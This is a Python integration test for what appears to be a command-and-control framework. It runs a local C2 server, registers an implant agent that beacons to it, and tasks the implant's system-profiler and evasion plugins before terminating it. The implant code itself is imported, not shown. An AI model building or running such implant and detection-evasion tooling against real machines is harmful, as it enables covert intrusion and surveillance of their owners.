import pytest
import threading
import time
import uvicorn
import requests
import os
import json
import socket
from fastapi import FastAPI
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from crawler.c2.main import app as main_app
from crawler.c2.api import get_db
from crawler.c2 import models as c2_models
from crawler.implant.agent_core import CrawlerAgent
from crawler.c2.database import Base

# --- Test Configuration ---
HOST = "127.0.0.1"
PORT = 8888
C2_URL = f"http://{HOST}:{PORT}/api"
CONFIG_FILE = os.path.join(os.path.expanduser("~"), ".crawler_config.json")
RULES_FILE = os.path.join("crawler", "implant", "rules.json")
TEMP_PLUGIN_PATH = os.path.join("crawler", "implant", "plugins", "temp_plugin.py")

# --- Test App and DB Setup ---
test_app = FastAPI()
test_app.include_router(main_app.router)

TEST_DB_URL = "sqlite:///./test_crawler.db"
test_engine = create_engine(TEST_DB_URL, connect_args={"check_same_thread": False})
TestingSessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=test_engine)

def override_get_db():
    try:
        db = TestingSessionLocal()
        yield db
    finally:
        db.close()

test_app.dependency_overrides[get_db] = override_get_db

# --- Uvicorn Server Fixture ---
class UvicornTestServer(uvicorn.Server):
    def install_signal_handlers(self): pass
    def run_in_thread(self):
        self._thread = threading.Thread(target=self.run)
        self._thread.daemon = True
        self._thread.start()
        while not self.started: time.sleep(1e-3)
    def stop(self):
        self.should_exit = True
        if self._thread and self._thread.is_alive(): self._thread.join()

@pytest.fixture(scope="module")
def c2_server_and_db():
    if os.path.exists("./test_crawler.db"): os.remove("./test_crawler.db")
    Base.metadata.create_all(bind=test_engine)
    config = uvicorn.Config(test_app, host=HOST, port=PORT, log_level="info")
    server = UvicornTestServer(config=config)
    server.run_in_thread()
    yield
    server.stop()
    if os.path.exists("./test_crawler.db"): os.remove("./test_crawler.db")

# --- Main Integration Test ---
def test_comprehensive_flow(c2_server_and_db):
    if os.path.exists(CONFIG_FILE): os.remove(CONFIG_FILE)
    if os.path.exists(RULES_FILE): os.remove(RULES_FILE)

    # 1. Start agent
    agent = CrawlerAgent(c2_url=C2_URL)
    agent.BEACON_INTERVAL_SECONDS = 2
    agent_thread = threading.Thread(target=agent.run, name="AgentThread")
    agent_thread.daemon = True
    agent_thread.start()
    time.sleep(3)

    # 2. Verify registration
    db = TestingSessionLocal()
    implants = db.query(c2_models.Implant).all()
    assert len(implants) == 1
    implant_id = implants[0].id
    db.close()
    print(f"\nTest: Agent registered with ID: {implant_id}")

    # 3. Test System Profiler
    print("\n--- Testing System Profiler ---")
    requests.put(f"{C2_URL}/admin/tier/{implant_id}/2")
    task_payload = {"command": "start_plugin", "args": {"plugin_name": "system_profiler"}}
    requests.post(f"{C2_URL}/admin/tasks/{implant_id}", json=task_payload)
    time.sleep(agent.BEACON_INTERVAL_SECONDS + 2)

    # 4. Test Evasion Plugin
    print("\n--- Testing Evasion Plugin ---")
    print("Test: Setting implant tier to 1 for evasion plugin.")
    response = requests.put(f"{C2_URL}/admin/tier/{implant_id}/1")
    assert response.status_code == 200

    evasion_task_payload = {"command": "start_plugin", "args": {"plugin_name": "evasion"}}
    response = requests.post(f"{C2_URL}/admin/tasks/{implant_id}", json=evasion_task_payload)
    assert response.status_code == 200 # Ensure task was created
    time.sleep(agent.BEACON_INTERVAL_SECONDS + 2)

    # Verify evasion results
    response = requests.get(f"{C2_URL}/admin/tasks/{implant_id}")
    assert response.status_code == 200
    tasks = response.json()

    evasion_task_found = False
    for task in tasks:
        if task.get("command") == "start_plugin" and task.get("args", {}).get("plugin_name") == "evasion":
            assert task["status"] == "completed"
            assert task["result"]
            result_data = json.loads(task["result"])
            assert isinstance(result_data, dict)
            assert len(result_data) > 0 # Expecting some indicators in a test env
            print(f"Test: Evasion plugin ran successfully, results: {result_data}")
            evasion_task_found = True
            break
    assert evasion_task_found, "Evasion plugin task was not found in the task list."

    # 5. Terminate
    print("\n--- Terminating Agent ---")
    terminate_payload = {"command": "terminate", "args": {}}
    requests.post(f"{C2_URL}/admin/tasks/{implant_id}", json=terminate_payload)
    agent_thread.join(timeout=5)
    assert not agent_thread.is_alive()
    print("Test: Comprehensive flow test finished.")
